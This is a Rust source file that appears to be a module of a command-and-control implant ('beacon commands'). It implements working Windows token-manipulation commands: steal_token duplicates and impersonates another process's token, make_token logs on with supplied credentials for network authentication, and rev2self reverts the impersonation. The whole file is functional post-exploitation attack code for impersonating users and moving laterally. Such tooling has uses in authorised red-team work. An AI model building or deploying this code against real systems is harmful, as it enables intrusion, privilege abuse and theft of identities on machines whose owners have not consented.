//! Windows token manipulation — steal_token, make_token, rev2self.
//!
//! All Win32 calls are behind `#[cfg(target_os = "windows")]`.
//! Non-Windows builds get stubs that return an error string.

/// Persistent token state held across beacon commands.
#[allow(dead_code)]
pub struct TokenState {
    pub impersonating: bool,
    pub impersonated_user: Option<String>,
    #[cfg(target_os = "windows")]
    token_handle: *mut std::ffi::c_void, // HANDLE
}

impl TokenState {
    pub fn new() -> Self {
        Self {
            impersonating: false,
            impersonated_user: None,
            #[cfg(target_os = "windows")]
            token_handle: std::ptr::null_mut(),
        }
    }
}

// ─── Windows implementation ───────────────────────────────────────────

#[cfg(target_os = "windows")]
mod win {
    use super::TokenState;
    use anyhow::Result;
    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE};
    use windows_sys::Win32::Security::{
        DuplicateTokenEx, GetTokenInformation, ImpersonateLoggedOnUser, LogonUserW,
        LookupAccountSidW, RevertToSelf, SecurityImpersonation,
        TokenImpersonation, TokenUser, LOGON32_LOGON_NEW_CREDENTIALS,
        LOGON32_PROVIDER_DEFAULT, TOKEN_DUPLICATE, TOKEN_QUERY, TOKEN_USER,
    };
    use windows_sys::Win32::System::Threading::{
        OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION,
    };

    /// Maximum access for the duplicated token.
    const TOKEN_ALL_ACCESS: u32 = 0x000F_01FF;

    /// Resolve DOMAIN\user from a token handle via GetTokenInformation + LookupAccountSidW.
    unsafe fn lookup_token_user(token: HANDLE) -> Option<String> {
        // First call: query required buffer size.
        let mut size: u32 = 0;
        GetTokenInformation(token, TokenUser, std::ptr::null_mut(), 0, &mut size);
        if size == 0 {
            return None;
        }

        let mut buf = vec![0u8; size as usize];
        if GetTokenInformation(
            token,
            TokenUser,
            buf.as_mut_ptr().cast(),
            size,
            &mut size,
        ) == 0
        {
            return None;
        }

        let token_user = &*(buf.as_ptr() as *const TOKEN_USER);
        let sid = token_user.User.Sid;

        let mut name = [0u16; 256];
        let mut name_len: u32 = 256;
        let mut domain = [0u16; 256];
        let mut domain_len: u32 = 256;
        let mut sid_type: i32 = 0;

        if LookupAccountSidW(
            std::ptr::null(),
            sid,
            name.as_mut_ptr(),
            &mut name_len,
            domain.as_mut_ptr(),
            &mut domain_len,
            &mut sid_type,
        ) == 0
        {
            return None;
        }

        let domain_str = String::from_utf16_lossy(&domain[..domain_len as usize]);
        let name_str = String::from_utf16_lossy(&name[..name_len as usize]);
        Some(format!("{}\\{}", domain_str, name_str))
    }

    /// Open a process token, duplicate it, and impersonate.
    pub fn steal_token(state: &mut TokenState, pid: u32) -> Result<(i32, String, String)> {
        unsafe {
            let proc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
            if proc.is_null() {
                return Ok((
                    1,
                    String::new(),
                    format!("OpenProcess failed: error {}", GetLastError()),
                ));
            }

            let mut token: HANDLE = std::ptr::null_mut();
            if OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut token) == 0 {
                let err = GetLastError();
                CloseHandle(proc);
                return Ok((
                    1,
                    String::new(),
                    format!("OpenProcessToken failed: error {}", err),
                ));
            }
            CloseHandle(proc);

            let mut dup_token: HANDLE = std::ptr::null_mut();
            if DuplicateTokenEx(
                token,
                TOKEN_ALL_ACCESS,
                std::ptr::null(),
                SecurityImpersonation,
                TokenImpersonation,
                &mut dup_token,
            ) == 0
            {
                let err = GetLastError();
                CloseHandle(token);
                return Ok((
                    1,
                    String::new(),
                    format!("DuplicateTokenEx failed: error {}", err),
                ));
            }
            CloseHandle(token);

            if ImpersonateLoggedOnUser(dup_token) == 0 {
                let err = GetLastError();
                CloseHandle(dup_token);
                return Ok((
                    1,
                    String::new(),
                    format!("ImpersonateLoggedOnUser failed: error {}", err),
                ));
            }

            let user =
                lookup_token_user(dup_token).unwrap_or_else(|| "unknown".to_string());

            // Clean up previous impersonation token.
            if state.impersonating && !state.token_handle.is_null() {
                CloseHandle(state.token_handle);
            }

            state.impersonating = true;
            state.impersonated_user = Some(user.clone());
            state.token_handle = dup_token;

            Ok((0, format!("[*] Impersonating: {}", user), String::new()))
        }
    }

    /// Create a new logon token (LOGON32_LOGON_NEW_CREDENTIALS — affects network auth only).
    pub fn make_token(
        state: &mut TokenState,
        domain_user: &str,
        password: &str,
    ) -> Result<(i32, String, String)> {
        let (domain, user) = match domain_user.split_once('\\') {
            Some(pair) => pair,
            None => {
                return Ok((
                    1,
                    String::new(),
                    "expected format: DOMAIN\\user".to_string(),
                ))
            }
        };

        let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
        let user_w: Vec<u16> = user.encode_utf16().chain(std::iter::once(0)).collect();
        let pass_w: Vec<u16> = password.encode_utf16().chain(std::iter::once(0)).collect();

        unsafe {
            let mut token: HANDLE = std::ptr::null_mut();
            if LogonUserW(
                user_w.as_ptr(),
                domain_w.as_ptr(),
                pass_w.as_ptr(),
                LOGON32_LOGON_NEW_CREDENTIALS,
                LOGON32_PROVIDER_DEFAULT,
                &mut token,
            ) == 0
            {
                return Ok((
                    1,
                    String::new(),
                    format!("LogonUserW failed: error {}", GetLastError()),
                ));
            }

            if ImpersonateLoggedOnUser(token) == 0 {
                let err = GetLastError();
                CloseHandle(token);
                return Ok((
                    1,
                    String::new(),
                    format!("ImpersonateLoggedOnUser failed: error {}", err),
                ));
            }

            // Clean up previous impersonation token.
            if state.impersonating && !state.token_handle.is_null() {
                CloseHandle(state.token_handle);
            }

            state.impersonating = true;
            state.impersonated_user = Some(domain_user.to_string());
            state.token_handle = token;

            Ok((
                0,
                format!("[*] Token created for: {} (network auth only)", domain_user),
                String::new(),
            ))
        }
    }

    /// Revert to the original process token and close the impersonation handle.
    pub fn rev2self(state: &mut TokenState) -> Result<(i32, String, String)> {
        unsafe {
            if RevertToSelf() == 0 {
                return Ok((
                    1,
                    String::new(),
                    format!("RevertToSelf failed: error {}", GetLastError()),
                ));
            }

            if !state.token_handle.is_null() {
                CloseHandle(state.token_handle);
            }

            state.impersonating = false;
            state.impersonated_user = None;
            state.token_handle = std::ptr::null_mut();

            Ok((0, "[*] Reverted to self".to_string(), String::new()))
        }
    }
}

// ─── Non-Windows stubs ────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
mod stub {
    use super::TokenState;
    use anyhow::Result;

    pub fn steal_token(_state: &mut TokenState, _pid: u32) -> Result<(i32, String, String)> {
        Ok((1, String::new(), "steal_token requires Windows".to_string()))
    }

    pub fn make_token(
        _state: &mut TokenState,
        _domain_user: &str,
        _password: &str,
    ) -> Result<(i32, String, String)> {
        Ok((
            1,
            String::new(),
            "make_token requires Windows".to_string(),
        ))
    }

    pub fn rev2self(_state: &mut TokenState) -> Result<(i32, String, String)> {
        Ok((1, String::new(), "rev2self requires Windows".to_string()))
    }
}

#[cfg(target_os = "windows")]
pub use win::{make_token, rev2self, steal_token};

#[cfg(not(target_os = "windows"))]
pub use stub::{make_token, rev2self, steal_token};
